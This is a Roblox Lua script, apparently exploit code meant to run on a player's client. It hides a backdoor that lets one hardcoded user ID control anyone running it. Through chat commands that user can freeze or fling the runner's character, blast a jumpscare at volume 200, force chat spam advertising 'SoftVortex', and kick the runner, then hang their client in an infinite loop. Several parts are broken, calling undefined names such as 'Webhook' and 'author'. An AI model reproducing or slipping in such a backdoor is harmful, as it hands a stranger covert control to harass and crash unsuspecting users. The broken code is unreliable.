local player = game.Players.LocalPlayer
local Players = game:GetService("Players")

local Admins = {
    2200052651,
}

local function commands(msg, plr)
    if table.find(Admins, plr) then
        local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg, ".")
        local Lower = string.lower(player.Name)
        local Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], ":freeze") then
                player.Character.HumanoidRootPart.Anchored = true
            end
            if string.find(SplitCMD[1], ":ban") then
            local Glide = Instance.new("Animation", game.Workspace)
            Glide.AnimationId = "rbxassetid://6507976593"
            local Glide = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Glide)
            Glide:Play()
            end
            if string.find(SplitCMD[1], ":unfreeze") then
                player.Character.HumanoidRootPart.Anchored = false
            end
            if string.find(SplitCMD[1], ":users") then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get Good, Get SoftVortex!", "All")
            end
            if string.find(SplitCMD[1], ":fling") then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end
            if string.find(SplitCMD[1], ":kill") then
               local plr = game.Players.LocalPlayer
                game.Players[SplitCMD[1]].Character.Humanoid.Health = 0
            end
            if string.find(SplitCMD[1], ":bring") then
            local plr=game:service"Players".LocalPlayer;
            local tweens=game:service"TweenService";
            local info=TweenInfo.new(7,Enum.EasingStyle.Quad);
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
            local tween=tweens:Create(plr.Character["HumanoidRootPart"],info,{CFrame=pos});
            tween:Play();
            end
            if string.find(SplitCMD[1], ":scare") then
                function Scare()
                    local ScreenGui = Instance.new("ScreenGui")
                    local ImageLabel = Instance.new("ImageLabel")

                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}

                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}

                    ScreenGui.Parent = game.CoreGui
                    ScreenGui.Name = "SCREAM"
                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

                    ImageLabel.Parent = ScreenGui
                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
                    ImageLabel.Visible = false
                    ImageLabel.BackgroundTransparency = 1
                    ImageLabel.Visible = true
                    local sound = Instance.new("Sound")
                    sound.Parent = game.Workspace
                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
                    sound.Volume = 200
                    sound:Play()
                    for i = 0, 1, 0.1 do
                        wait(0.05)
                        ImageLabel.ImageTransparency = i
                    end
                    sound.Ended:Wait()
                    sound:Destroy()
                    ScreenGui:Destroy()
                end
                if not game.CoreGui:FindFirstChild("SCREAM") then
                    Scare()
                end
            end
            if string.find(SplitCMD[1], ":kick") then
                local ISADMIN = table.find(Admins, player.UserId)
                if not ISADMIN then
                    player:Kick("Kicked.")
                    Webhook(player, "USER KICKED!")
                    wait(5)
                    while true do
                    end
                end
            end
        else
end
    end
end

Players.PlayerAdded:Connect(
    function(plr)
        local ADMINS = table.find(Admins, plr.UserId)
        if ADMINS then
            plr.Chatted:Connect(
                function(msg)
                    commands(msg, plr.UserId)
                end
            )
        end
    end
)

for i, v in pairs(game:GetService("Players"):GetChildren()) do
    local ADMINS = table.find(Admins, v.UserId)
    if ADMINS then
        v.Chatted:Connect(
            function(msg)
                commands(msg, v.UserId)
            end
        )
    end
end
